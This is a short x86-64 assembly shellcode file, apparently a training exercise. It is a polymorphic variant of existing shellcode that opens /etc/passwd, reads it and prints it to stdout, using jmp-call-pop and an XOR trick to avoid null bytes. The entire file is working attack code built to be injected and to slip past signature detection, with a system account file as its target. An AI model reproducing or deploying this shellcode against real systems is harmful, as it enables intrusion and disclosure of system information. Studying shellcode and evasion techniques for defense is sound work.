BITS 64
; Polymorphic version of Mr. Un1k0d3rs /etc/passwd read shellcode
; Orig Size: 82 bytes
; Polymorphic size: 79 bytes
global _start

section .text

_start:
jmp _push_filename
  
_readfile:
; syscall open file
pop rdi ; pop path value
; NULL byte fix
xor byte [rdi + 11], 0x42
  
xor rax, rax
mov rsi, rax ; null out rsi
cdq
add al, 2
syscall
  
; syscall read file
sub sp, 0xfff
lea rsi, [rsp]
mov rdi, rax
mov dx, 0xfff; size to read
xor rax, rax
syscall
  
; syscall write to stdout
xor rdi, rdi
inc rdi
mov rdx, rax
xor rax, rax
inc al
syscall
  
; syscall exit
xor rax, rax
add al, 60
syscall
  
_push_filename:
call _readfile
path: db "/etc/passwdB"
